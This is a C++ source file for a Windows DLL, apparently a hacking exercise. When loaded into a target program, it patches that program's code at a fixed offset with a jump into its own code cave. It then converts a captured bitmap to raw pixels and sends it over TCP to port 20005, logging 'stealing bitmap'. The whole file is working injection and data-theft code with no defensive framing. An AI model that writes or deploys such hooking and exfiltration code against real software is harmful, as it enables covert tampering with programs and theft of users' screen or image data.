#include <iostream>
#include <stdint.h>

#include <winsock2.h>
#include <ws2tcpip.h>

#include <Windows.h>

#include <optional>

#include "Packet.h"

#pragma comment (lib, "Ws2_32.lib")

std::optional<Packet> BitmapToPacket(HBITMAP hBitmap) {
    Packet result;

    BITMAP bmp;
    if (!GetObject(hBitmap, sizeof(BITMAP), &bmp))
        return std::nullopt;

    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    result.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    result.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = bmp.bmBitsPixel;
    result.biBitCount = bmp.bmBitsPixel;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    DWORD dwBmpSize = ((bmp.bmWidth * bmp.bmBitsPixel + 31) / 32) * 4 * bmp.bmHeight;
    result.payload = (BYTE*)malloc(dwBmpSize);

    HDC hDC = GetDC(NULL);
    if (hDC == NULL)
        return std::nullopt;

    if (!GetDIBits(hDC, hBitmap, 0, bmp.bmHeight, result.payload, (BITMAPINFO*)&bi, DIB_RGB_COLORS)) {
        ReleaseDC(NULL, hDC);
        free(result.payload);
        return std::nullopt;
    }

    ReleaseDC(NULL, hDC);
    result.payloadSize = dwBmpSize;
    return result;
}

SOCKET connect() {
    SOCKET connectSocket = INVALID_SOCKET;
    struct addrinfo* address = NULL;
    struct addrinfo hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    auto port = "20005";
    if (auto result = getaddrinfo(NULL, port, &hints, &address); result) {
        printf("getaddrinfo failed with error: %d\n", result);
        return INVALID_SOCKET;
    }

    for (struct addrinfo* ptr = address; ptr != NULL; ptr = ptr->ai_next) {
        connectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (connectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            return INVALID_SOCKET;
        }

        auto result = connect(connectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (result == SOCKET_ERROR) {
            closesocket(connectSocket);
            connectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(address);

    return connectSocket;
}

bool send(SOCKET socket, Packet::size_t data) {
    auto result = send(
        socket,
        reinterpret_cast<const char*>(&data),
        sizeof(Packet::size_t),
        0);

    if (result == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(socket);
        return false;
    }

    return true;
}

void send(SOCKET socket, Packet& packet) {
    if (socket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        return;
    }

    if (!send(socket, packet.biWidth) ||
        !send(socket, packet.biHeight) ||
        !send(socket, packet.biBitCount) ||
        !send(socket, packet.payloadSize)) {
        return;
    }

    int bytesSend = 0;

    const char* payload = reinterpret_cast<char*>(packet.payload);

    while (bytesSend != packet.payloadSize) {

        auto result = send(socket, payload, packet.payloadSize, 0);
        if (result == SOCKET_ERROR) {
            printf("send failed with error: %d\n", WSAGetLastError());
            closesocket(socket);
            return;
        }

        bytesSend += result;
        payload += result;
    }

    if (auto result = shutdown(socket, SD_SEND);  result == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(socket);
        return;
    }

    closesocket(socket);
}

extern "C" void sendBitmap(HBITMAP hBitmap) {
    WSADATA wsaData;

    printf("stealing bitmap\n");

    if (auto result = WSAStartup(MAKEWORD(2, 2), &wsaData); result) {
        printf("WSAStartup failed with error: %d\n", result);
        return;
    }

    if (auto packet = BitmapToPacket(hBitmap); packet) {
        printf("biWidth: %d\n", packet->biWidth);
        printf("biHeight: %d\n", packet->biHeight);
        printf("biBitCount: %d\n", packet->biBitCount);
        printf("payloadSize: %d\n", packet->payloadSize);
        send(connect(), *packet);
        free(packet->payload);
    }

    WSACleanup();
}

extern "C" void codeCave();

//DWORD hook_address = 0x00007FF716095CB0;
//DWORD ret_address = 0x00007FF7BE545CB6;
//DWORD hook_address = 0x00007FF716095CB0;
//uint64_t hook_address = 0x00007FF7488B5CB0; // address when attaching with the x64dgb
//DWORD hook_address = 0x00007FF798FC5CB0; // address when starting in the x64dgb

constexpr uint64_t hookOffset = 0x1C08A;
constexpr uint64_t codeCaveOffset = 0x16260;

BYTE nop = 0x90;
//Mov rax 48 B8
// E8 CA B4 FF FF 51 52 41
BYTE mov1 = 0x48, rax1 = 0xB8;
//Call rax FF D0
BYTE call2 = 0xFF, rax2 = 0xD0;

// 33 D2
// 48 8B 4D 28
// FF 15 8A 8F 01 00

inline void printLastError() {
    DWORD dwError = GetLastError();
    std::cout << "Error code: " << dwError << std::endl;
    char errorMsg[1024];
    FormatMessageA(
        FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        dwError,
        0,
        errorMsg,
        sizeof(errorMsg),
        NULL
    );

    std::wcout << "Error message: " << errorMsg << std::endl;
}

uint64_t getHookLocation() {
    auto handle = GetModuleHandle(NULL);

    if (handle == NULL) {
        std::wcout << "Failed to get module handle" << std::endl;
        printLastError();
        return 0;
    }

    return (uint64_t)handle + hookOffset;
}

uint64_t getCodeCaveLocation() {
    auto handle = GetModuleHandle("offender.dll");

    if (handle == NULL) {
        std::wcout << "Failed to get offender.dll handle" << std::endl;
        printLastError();
        return 0;
    }

    return (uint64_t)handle + codeCaveOffset;
}

void hookCode() {
    auto hookLocation = (char*)getHookLocation();
    auto codeCaveLocation = getCodeCaveLocation();

    DWORD old_protect;
    auto res = VirtualProtect((void*)hookLocation, 6, PAGE_EXECUTE_READWRITE, &old_protect);

    if (res == 0) {
        std::cout << "virtual protect failed" << std::endl;
        printLastError();
        return;
    }

    *(hookLocation) = mov1;
    *(hookLocation + 1) = rax1;
    *((uint64_t*)(hookLocation + 2)) = codeCaveLocation;
    *(hookLocation + 10) = call2;
    *(hookLocation + 11) = rax2;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved) {
    switch (nReason) {
    case DLL_PROCESS_ATTACH:
        hookCode();
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}